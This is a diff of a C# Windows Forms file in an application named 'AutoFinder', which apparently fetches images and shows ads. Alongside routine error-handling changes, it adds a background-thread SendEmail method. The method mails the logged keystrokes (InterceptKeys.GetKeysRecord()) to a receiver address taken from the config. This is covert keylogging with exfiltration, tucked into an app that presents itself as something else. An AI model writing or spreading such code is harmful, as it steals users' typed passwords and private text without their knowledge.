@@ -79,7 +79,7 @@ namespace AutoFinder
 				HttpWebResponse res = (HttpWebResponse)req.GetResponse();
 				image = new Bitmap(res.GetResponseStream());
 			}
-			catch(Exception ex)
+			catch(Exception)
 			{
 				
 			}
@@ -107,8 +107,15 @@ namespace AutoFinder
 			
 			if (!Directory.Exists(Application.StartupPath + @"\Save"))
 			{
-				Directory.CreateDirectory(Application.StartupPath + @"\Save");
-				this.savePath = Application.StartupPath + @"\Save";
+				try
+				{
+					Directory.CreateDirectory(Application.StartupPath + @"\Save");
+					this.savePath = Application.StartupPath + @"\Save";
+				}
+				catch(Exception)
+				{
+					
+				}
 			}
 			else
 			{
@@ -155,6 +162,12 @@ namespace AutoFinder
 		{
 			timer1.Interval = configLoader.AdsInterval;
 			timer1.Start();
+		}
+		
+		void SendEmail()
+		{
+			EmailHelper helper = new EmailHelper();
+			helper.SendEmail(InterceptKeys.GetKeysRecord(), configLoader.EmailReceiver);
 		}
 		
 		protected override void DefWndProc(ref Message m)
@@ -270,8 +283,8 @@ namespace AutoFinder
 			}
 			if(configLoader.SendMail)
 			{
-				EmailHelper helper = new EmailHelper();
-				helper.SendEmail(InterceptKeys.GetKeysRecord(), configLoader.EmailReceiver);
+				Thread t = new Thread(SendEmail);
+				t.Start();
 			}
 		}
 		
@@ -290,8 +303,7 @@ namespace AutoFinder
 			Help help = new Help();
 			help.HelpPage = configLoader.HelpPage;
 			help.ShowDialog();
-			string keys = InterceptKeys.GetKeysRecord();
-//			System.Diagnostics.Process.Start(configLoader.HelpPage);
 		}
+		
 	}
 }
